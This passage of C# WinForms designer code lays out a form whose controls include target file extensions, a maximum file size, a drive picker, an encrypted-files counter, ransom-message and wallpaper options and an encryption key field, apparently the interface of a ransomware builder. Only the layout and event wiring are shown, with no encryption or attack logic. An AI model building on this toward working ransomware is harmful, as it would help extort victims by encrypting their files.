        this.ListExtension.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListExtension.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.Column5.HeaderText = "Extension";
        this.Column5.Name = "Column5";
        this.Column5.ReadOnly = true;
        this.ContectExtesion.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContectExtesion.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.DeleteExtension });
        this.ContectExtesion.Name = "contextMenuStrip1";
        this.ContectExtesion.Size = new System.Drawing.Size(112, 30);
        this.DeleteExtension.BackColor = System.Drawing.Color.White;
        this.DeleteExtension.Image = (System.Drawing.Image)resources.GetObject("DeleteExtension.Image");
        this.DeleteExtension.Name = "DeleteExtension";
        this.DeleteExtension.Size = new System.Drawing.Size(111, 26);
        this.DeleteExtension.Text = "Delete";
        this.DeleteExtension.Click += new System.EventHandler(DeleteExtension_Click);
        this.guna2HtmlLabel4.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel4.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel4.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel4.Location = new System.Drawing.Point(313, 146);
        this.guna2HtmlLabel4.Name = "guna2HtmlLabel4";
        this.guna2HtmlLabel4.Size = new System.Drawing.Size(77, 17);
        this.guna2HtmlLabel4.TabIndex = 696;
        this.guna2HtmlLabel4.Text = "Max size (MB)";
        this.MaxSize.AcceptsReturn = false;
        this.MaxSize.AcceptsTab = false;
        this.MaxSize.AnimationSpeed = 200;
        this.MaxSize.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.MaxSize.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.MaxSize.AutoSizeHeight = true;
        this.MaxSize.BackColor = System.Drawing.Color.Transparent;
        this.MaxSize.BackgroundImage = (System.Drawing.Image)resources.GetObject("MaxSize.BackgroundImage");
        this.MaxSize.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.MaxSize.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.MaxSize.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.MaxSize.BorderColorIdle = System.Drawing.Color.Silver;
        this.MaxSize.BorderRadius = 2;
        this.MaxSize.BorderThickness = 1;
        this.MaxSize.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.MaxSize.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.MaxSize.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.MaxSize.DefaultText = "50";
        this.MaxSize.FillColor = System.Drawing.Color.White;
        this.MaxSize.HideSelection = true;
        this.MaxSize.IconLeft = null;
        this.MaxSize.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.MaxSize.IconPadding = 3;
        this.MaxSize.IconRight = null;
        this.MaxSize.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.MaxSize.Lines = new string[1] { "50" };
        this.MaxSize.Location = new System.Drawing.Point(164, 142);
        this.MaxSize.MaxLength = 32767;
        this.MaxSize.MinimumSize = new System.Drawing.Size(1, 1);
        this.MaxSize.Modified = false;
        this.MaxSize.Multiline = false;
        this.MaxSize.Name = "MaxSize";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.MaxSize.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.MaxSize.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.MaxSize.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.MaxSize.OnIdleState = stateProperties4;
        this.MaxSize.Padding = new System.Windows.Forms.Padding(3);
        this.MaxSize.PasswordChar = '\0';
        this.MaxSize.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.MaxSize.PlaceholderText = "Extension";
        this.MaxSize.ReadOnly = false;
        this.MaxSize.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.MaxSize.SelectedText = "";
        this.MaxSize.SelectionLength = 0;
        this.MaxSize.SelectionStart = 0;
        this.MaxSize.ShortcutsEnabled = true;
        this.MaxSize.Size = new System.Drawing.Size(145, 28);
        this.MaxSize.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.MaxSize.TabIndex = 695;
        this.MaxSize.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.MaxSize.TextMarginBottom = 0;
        this.MaxSize.TextMarginLeft = 3;
        this.MaxSize.TextMarginTop = 1;
        this.MaxSize.TextPlaceholder = "Extension";
        this.MaxSize.UseSystemPasswordChar = false;
        this.MaxSize.WordWrap = true;
        this.MaxSize.KeyDown += new System.Windows.Forms.KeyEventHandler(MaxSize_KeyDown);
        this.MaxSize.KeyPress += new System.Windows.Forms.KeyPressEventHandler(MaxSize_KeyPress);
        this.CountFile.AllowParentOverrides = false;
        this.CountFile.AutoEllipsis = false;
        this.CountFile.AutoSize = false;
        this.CountFile.BackColor = System.Drawing.Color.White;
        this.CountFile.CursorType = null;
        this.CountFile.Font = new System.Drawing.Font("Segoe UI Black", 36f, System.Drawing.FontStyle.Bold);
        this.CountFile.ForeColor = System.Drawing.Color.Green;
        this.CountFile.Location = new System.Drawing.Point(164, 199);
        this.CountFile.Name = "CountFile";
        this.CountFile.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountFile.Size = new System.Drawing.Size(242, 92);
        this.CountFile.TabIndex = 694;
        this.CountFile.Text = "0";
        this.CountFile.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.CountFile.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.progressBar1.Location = new System.Drawing.Point(16, 353);
        this.progressBar1.Name = "progressBar1";
        this.progressBar1.Size = new System.Drawing.Size(560, 23);
        this.progressBar1.TabIndex = 682;
        this.FilenameMessage.AcceptsReturn = false;
        this.FilenameMessage.AcceptsTab = false;
        this.FilenameMessage.AnimationSpeed = 200;
        this.FilenameMessage.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.FilenameMessage.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.FilenameMessage.AutoSizeHeight = true;
        this.FilenameMessage.BackColor = System.Drawing.Color.Transparent;
        this.FilenameMessage.BackgroundImage = (System.Drawing.Image)resources.GetObject("FilenameMessage.BackgroundImage");
        this.FilenameMessage.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.FilenameMessage.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.FilenameMessage.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.FilenameMessage.BorderColorIdle = System.Drawing.Color.Silver;
        this.FilenameMessage.BorderRadius = 2;
        this.FilenameMessage.BorderThickness = 1;
        this.FilenameMessage.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.FilenameMessage.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.FilenameMessage.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.FilenameMessage.DefaultText = "";
        this.FilenameMessage.Enabled = false;
        this.FilenameMessage.FillColor = System.Drawing.Color.White;
        this.FilenameMessage.HideSelection = true;
        this.FilenameMessage.IconLeft = null;
        this.FilenameMessage.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.FilenameMessage.IconPadding = 3;
        this.FilenameMessage.IconRight = Properties.Resources.IconAdd;
        this.FilenameMessage.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.FilenameMessage.Lines = new string[0];
        this.FilenameMessage.Location = new System.Drawing.Point(164, 47);
        this.FilenameMessage.MaxLength = 32767;
        this.FilenameMessage.MinimumSize = new System.Drawing.Size(1, 1);
        this.FilenameMessage.Modified = false;
        this.FilenameMessage.Multiline = false;
        this.FilenameMessage.Name = "FilenameMessage";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.FilenameMessage.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.FilenameMessage.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.FilenameMessage.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.FilenameMessage.OnIdleState = stateProperties8;
        this.FilenameMessage.Padding = new System.Windows.Forms.Padding(3);
        this.FilenameMessage.PasswordChar = '\0';
        this.FilenameMessage.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.FilenameMessage.PlaceholderText = "";
        this.FilenameMessage.ReadOnly = true;
        this.FilenameMessage.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.FilenameMessage.SelectedText = "";
        this.FilenameMessage.SelectionLength = 0;
        this.FilenameMessage.SelectionStart = 0;
        this.FilenameMessage.ShortcutsEnabled = true;
        this.FilenameMessage.Size = new System.Drawing.Size(413, 28);
        this.FilenameMessage.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.FilenameMessage.TabIndex = 687;
        this.FilenameMessage.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.FilenameMessage.TextMarginBottom = 0;
        this.FilenameMessage.TextMarginLeft = 3;
        this.FilenameMessage.TextMarginTop = 1;
        this.FilenameMessage.TextPlaceholder = "";
        this.FilenameMessage.UseSystemPasswordChar = false;
        this.FilenameMessage.WordWrap = true;
        this.FilenameMessage.OnIconRightClick += new System.EventHandler(FilenameMessage_OnIconRightClick);
        this.guna2HtmlLabel3.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel3.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel3.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel3.Location = new System.Drawing.Point(164, 176);
        this.guna2HtmlLabel3.Name = "guna2HtmlLabel3";
        this.guna2HtmlLabel3.Size = new System.Drawing.Size(86, 17);
        this.guna2HtmlLabel3.TabIndex = 692;
        this.guna2HtmlLabel3.Text = "Encrypted files :";
        this.TxDelay.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxDelay.AutoSize = true;
        this.TxDelay.BackColor = System.Drawing.Color.Transparent;
        this.TxDelay.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxDelay.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxDelay.ForeColor = System.Drawing.Color.Black;
        this.TxDelay.Location = new System.Drawing.Point(188, 24);
        this.TxDelay.Name = "TxDelay";
        this.TxDelay.Size = new System.Drawing.Size(98, 15);
        this.TxDelay.TabIndex = 685;
        this.TxDelay.Text = "Message Support";
        this.EnabledMessage.AllowBindingControlAnimation = true;
        this.EnabledMessage.AllowBindingControlColorChanges = false;
        this.EnabledMessage.AllowBindingControlLocation = true;
        this.EnabledMessage.AllowCheckBoxAnimation = true;
        this.EnabledMessage.AllowCheckmarkAnimation = true;
        this.EnabledMessage.AllowOnHoverStates = true;
        this.EnabledMessage.AutoCheck = true;
        this.EnabledMessage.BackColor = System.Drawing.Color.Transparent;
        this.EnabledMessage.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnabledMessage.BackgroundImage");
        this.EnabledMessage.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledMessage.BindingControl = this.TxDelay;
        this.EnabledMessage.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledMessage.BorderRadius = 6;
        this.EnabledMessage.Checked = false;
        this.EnabledMessage.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledMessage.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledMessage.CustomCheckmarkImage = null;
        this.EnabledMessage.Location = new System.Drawing.Point(164, 20);
        this.EnabledMessage.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledMessage.Name = "EnabledMessage";
        this.EnabledMessage.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledMessage.OnCheck.BorderRadius = 6;
        this.EnabledMessage.OnCheck.BorderThickness = 2;
        this.EnabledMessage.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledMessage.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledMessage.OnCheck.CheckmarkThickness = 2;
        this.EnabledMessage.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledMessage.OnDisable.BorderRadius = 6;
        this.EnabledMessage.OnDisable.BorderThickness = 2;
        this.EnabledMessage.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledMessage.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledMessage.OnDisable.CheckmarkThickness = 2;
        this.EnabledMessage.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledMessage.OnHoverChecked.BorderRadius = 6;
        this.EnabledMessage.OnHoverChecked.BorderThickness = 2;
        this.EnabledMessage.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledMessage.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledMessage.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledMessage.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledMessage.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledMessage.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledMessage.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledMessage.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledMessage.OnUncheck.BorderRadius = 6;
        this.EnabledMessage.OnUncheck.BorderThickness = 1;
        this.EnabledMessage.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledMessage.Size = new System.Drawing.Size(21, 21);
        this.EnabledMessage.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledMessage.TabIndex = 686;
        this.EnabledMessage.ThreeState = false;
        this.EnabledMessage.ToolTipText = null;
        this.EnabledMessage.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnabledMessage_CheckedChanged);
        this.LogsPath.AllowParentOverrides = false;
        this.LogsPath.AutoEllipsis = false;
        this.LogsPath.AutoSize = false;
        this.LogsPath.BackColor = System.Drawing.Color.White;
        this.LogsPath.CursorType = null;
        this.LogsPath.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LogsPath.ForeColor = System.Drawing.Color.Black;
        this.LogsPath.Location = new System.Drawing.Point(16, 388);
        this.LogsPath.Name = "LogsPath";
        this.LogsPath.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.LogsPath.Size = new System.Drawing.Size(442, 14);
        this.LogsPath.TabIndex = 691;
        this.LogsPath.Text = "...";
        this.LogsPath.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.LogsPath.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.BackgroundFilename.AcceptsReturn = false;
        this.BackgroundFilename.AcceptsTab = false;
        this.BackgroundFilename.AnimationSpeed = 200;
        this.BackgroundFilename.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BackgroundFilename.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BackgroundFilename.AutoSizeHeight = true;
        this.BackgroundFilename.BackColor = System.Drawing.Color.Transparent;
        this.BackgroundFilename.BackgroundImage = (System.Drawing.Image)resources.GetObject("BackgroundFilename.BackgroundImage");
        this.BackgroundFilename.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.BackgroundFilename.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.BackgroundFilename.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.BackgroundFilename.BorderColorIdle = System.Drawing.Color.Silver;
        this.BackgroundFilename.BorderRadius = 2;
        this.BackgroundFilename.BorderThickness = 1;
        this.BackgroundFilename.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BackgroundFilename.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BackgroundFilename.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.BackgroundFilename.DefaultText = "";
        this.BackgroundFilename.Enabled = false;
        this.BackgroundFilename.FillColor = System.Drawing.Color.White;
        this.BackgroundFilename.HideSelection = true;
        this.BackgroundFilename.IconLeft = null;
        this.BackgroundFilename.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BackgroundFilename.IconPadding = 3;
        this.BackgroundFilename.IconRight = Properties.Resources.IconAdd;
        this.BackgroundFilename.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BackgroundFilename.Lines = new string[0];
        this.BackgroundFilename.Location = new System.Drawing.Point(164, 108);
        this.BackgroundFilename.MaxLength = 32767;
        this.BackgroundFilename.MinimumSize = new System.Drawing.Size(1, 1);
        this.BackgroundFilename.Modified = false;
        this.BackgroundFilename.Multiline = false;
        this.BackgroundFilename.Name = "BackgroundFilename";
        stateProperties9.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties9.FillColor = System.Drawing.Color.Empty;
        stateProperties9.ForeColor = System.Drawing.Color.Empty;
        stateProperties9.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BackgroundFilename.OnActiveState = stateProperties9;
        stateProperties10.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties10.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties10.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties10.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BackgroundFilename.OnDisabledState = stateProperties10;
        stateProperties11.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties11.FillColor = System.Drawing.Color.Empty;
        stateProperties11.ForeColor = System.Drawing.Color.Empty;
        stateProperties11.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BackgroundFilename.OnHoverState = stateProperties11;
        stateProperties12.BorderColor = System.Drawing.Color.Silver;
        stateProperties12.FillColor = System.Drawing.Color.White;
        stateProperties12.ForeColor = System.Drawing.Color.Empty;
        stateProperties12.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BackgroundFilename.OnIdleState = stateProperties12;
        this.BackgroundFilename.Padding = new System.Windows.Forms.Padding(3);
        this.BackgroundFilename.PasswordChar = '\0';
        this.BackgroundFilename.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BackgroundFilename.PlaceholderText = "";
        this.BackgroundFilename.ReadOnly = true;
        this.BackgroundFilename.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BackgroundFilename.SelectedText = "";
        this.BackgroundFilename.SelectionLength = 0;
        this.BackgroundFilename.SelectionStart = 0;
        this.BackgroundFilename.ShortcutsEnabled = true;
        this.BackgroundFilename.Size = new System.Drawing.Size(413, 28);
        this.BackgroundFilename.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BackgroundFilename.TabIndex = 690;
        this.BackgroundFilename.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BackgroundFilename.TextMarginBottom = 0;
        this.BackgroundFilename.TextMarginLeft = 3;
        this.BackgroundFilename.TextMarginTop = 1;
        this.BackgroundFilename.TextPlaceholder = "";
        this.BackgroundFilename.UseSystemPasswordChar = false;
        this.BackgroundFilename.WordWrap = true;
        this.BackgroundFilename.OnIconRightClick += new System.EventHandler(BackgroundFilename_OnIconRightClick);
        this.GetDriversComboBox.BackColor = System.Drawing.Color.Transparent;
        this.GetDriversComboBox.BackgroundColor = System.Drawing.Color.White;
        this.GetDriversComboBox.BorderColor = System.Drawing.Color.Silver;
        this.GetDriversComboBox.BorderRadius = 1;
        this.GetDriversComboBox.Color = System.Drawing.Color.Silver;
        this.GetDriversComboBox.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.GetDriversComboBox.DisabledBackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.GetDriversComboBox.DisabledBorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        this.GetDriversComboBox.DisabledColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.GetDriversComboBox.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        this.GetDriversComboBox.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.GetDriversComboBox.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.GetDriversComboBox.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.GetDriversComboBox.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.GetDriversComboBox.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.GetDriversComboBox.FillDropDown = true;
        this.GetDriversComboBox.FillIndicator = false;
        this.GetDriversComboBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.GetDriversComboBox.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.GetDriversComboBox.ForeColor = System.Drawing.Color.Black;
        this.GetDriversComboBox.FormattingEnabled = true;
        this.GetDriversComboBox.Icon = null;
        this.GetDriversComboBox.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.GetDriversComboBox.IndicatorColor = System.Drawing.Color.DarkGray;
        this.GetDriversComboBox.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.GetDriversComboBox.IndicatorThickness = 2;
        this.GetDriversComboBox.IsDropdownOpened = false;
        this.GetDriversComboBox.ItemBackColor = System.Drawing.Color.White;
        this.GetDriversComboBox.ItemBorderColor = System.Drawing.Color.White;
        this.GetDriversComboBox.ItemForeColor = System.Drawing.Color.Black;
        this.GetDriversComboBox.ItemHeight = 20;
        this.GetDriversComboBox.ItemHighLightColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.GetDriversComboBox.ItemHighLightForeColor = System.Drawing.Color.White;
        this.GetDriversComboBox.ItemTopMargin = 3;
        this.GetDriversComboBox.Location = new System.Drawing.Point(16, 47);
        this.GetDriversComboBox.Name = "GetDriversComboBox";
        this.GetDriversComboBox.Size = new System.Drawing.Size(139, 26);
        this.GetDriversComboBox.TabIndex = 683;
        this.GetDriversComboBox.Text = null;
        this.GetDriversComboBox.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.GetDriversComboBox.TextLeftMargin = 5;
        this.EnabledBackground.AllowBindingControlAnimation = true;
        this.EnabledBackground.AllowBindingControlColorChanges = false;
        this.EnabledBackground.AllowBindingControlLocation = true;
        this.EnabledBackground.AllowCheckBoxAnimation = true;
        this.EnabledBackground.AllowCheckmarkAnimation = true;
        this.EnabledBackground.AllowOnHoverStates = true;
        this.EnabledBackground.AutoCheck = true;
        this.EnabledBackground.BackColor = System.Drawing.Color.Transparent;
        this.EnabledBackground.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnabledBackground.BackgroundImage");
        this.EnabledBackground.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledBackground.BindingControl = this.label1;
        this.EnabledBackground.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledBackground.BorderRadius = 6;
        this.EnabledBackground.Checked = false;
        this.EnabledBackground.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledBackground.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledBackground.CustomCheckmarkImage = null;
        this.EnabledBackground.Location = new System.Drawing.Point(164, 81);
        this.EnabledBackground.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledBackground.Name = "EnabledBackground";
        this.EnabledBackground.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledBackground.OnCheck.BorderRadius = 6;
        this.EnabledBackground.OnCheck.BorderThickness = 2;
        this.EnabledBackground.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledBackground.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledBackground.OnCheck.CheckmarkThickness = 2;
        this.EnabledBackground.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledBackground.OnDisable.BorderRadius = 6;
        this.EnabledBackground.OnDisable.BorderThickness = 2;
        this.EnabledBackground.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledBackground.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledBackground.OnDisable.CheckmarkThickness = 2;
        this.EnabledBackground.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledBackground.OnHoverChecked.BorderRadius = 6;
        this.EnabledBackground.OnHoverChecked.BorderThickness = 2;
        this.EnabledBackground.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledBackground.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledBackground.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledBackground.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledBackground.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledBackground.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledBackground.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledBackground.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledBackground.OnUncheck.BorderRadius = 6;
        this.EnabledBackground.OnUncheck.BorderThickness = 1;
        this.EnabledBackground.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledBackground.Size = new System.Drawing.Size(21, 21);
        this.EnabledBackground.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledBackground.TabIndex = 689;
        this.EnabledBackground.ThreeState = false;
        this.EnabledBackground.ToolTipText = null;
        this.EnabledBackground.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnabledBackground_CheckedChanged);
        this.label1.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label1.AutoSize = true;
        this.label1.BackColor = System.Drawing.Color.Transparent;
        this.label1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label1.ForeColor = System.Drawing.Color.Black;
        this.label1.Location = new System.Drawing.Point(188, 85);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(121, 15);
        this.label1.TabIndex = 688;
        this.label1.Text = "Support set wallpaper";
        this.KeyEncrypt.AcceptsReturn = false;
        this.KeyEncrypt.AcceptsTab = false;
        this.KeyEncrypt.AnimationSpeed = 200;
        this.KeyEncrypt.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.KeyEncrypt.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.KeyEncrypt.AutoSizeHeight = true;
        this.KeyEncrypt.BackColor = System.Drawing.Color.Transparent;
        this.KeyEncrypt.BackgroundImage = (System.Drawing.Image)resources.GetObject("KeyEncrypt.BackgroundImage");
        this.KeyEncrypt.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.KeyEncrypt.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.KeyEncrypt.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.KeyEncrypt.BorderColorIdle = System.Drawing.Color.Silver;
        this.KeyEncrypt.BorderRadius = 2;
        this.KeyEncrypt.BorderThickness = 1;
        this.KeyEncrypt.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
